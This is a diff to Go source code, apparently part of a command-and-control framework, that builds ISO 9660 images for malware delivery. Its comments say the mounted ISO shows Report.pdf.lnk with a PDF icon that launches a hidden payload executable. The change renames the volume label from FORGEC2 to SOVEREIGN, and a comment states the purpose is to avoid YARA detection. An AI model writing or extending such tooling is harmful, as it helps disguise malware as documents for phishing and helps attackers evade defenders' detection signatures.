@@ -229,7 +229,7 @@ func isoEntryName(name, fallback string) (string, error) {
 
 // BuildISOWithLNK writes a minimal ISO 9660 containing a visible LNK (pdf icon) + hidden exe.
 // The ISO when mounted shows Report.pdf.lnk (PDF icon) that launches the hidden payload exe.
-// Volume label changed to REPORTS to avoid FORGEC2 YARA.
+// Volume label changed to REPORTS to avoid SOVEREIGN YARA.
 func BuildISOWithLNK(lnkName string, exeName string, exeData []byte) ([]byte, error) {
 	if lnkName == "" {
 		lnkName = "Report.pdf.lnk"
@@ -341,7 +341,7 @@ func BuildISO9660(filename string, data []byte) ([]byte, error) {
 	copy(pvd[1:6], "CD001")
 	pvd[6] = 1
 	copy(pvd[8:40], padSpace("LINUX", 32))
-	copy(pvd[40:72], padSpace("FORGEC2", 32))
+	copy(pvd[40:72], padSpace("SOVEREIGN", 32))
 	both32(pvd[80:88], uint32(totalSectors))
 	pvd[120] = 1
 	pvd[123] = 1
@@ -352,10 +352,10 @@ func BuildISO9660(filename string, data []byte) ([]byte, error) {
 	// Directory record for root at offset 156 (34 bytes)
 	writeDirRecord(pvd[156:156+34], uint32(rootLBA), sector, 2, "\x00")
 
-	copy(pvd[190:318], padSpace("FORGEC2", 128))
+	copy(pvd[190:318], padSpace("SOVEREIGN", 128))
 	copy(pvd[318:446], padSpace("", 128))
 	copy(pvd[446:574], padSpace("", 128))
-	copy(pvd[574:702], padSpace("FORGEC2", 128))
+	copy(pvd[574:702], padSpace("SOVEREIGN", 128))
 	copy(pvd[813:813+17], isoTime(time.Now()))
 	copy(pvd[830:847], isoTime(time.Now()))
 	copy(pvd[847:864], isoTime(time.Now()))
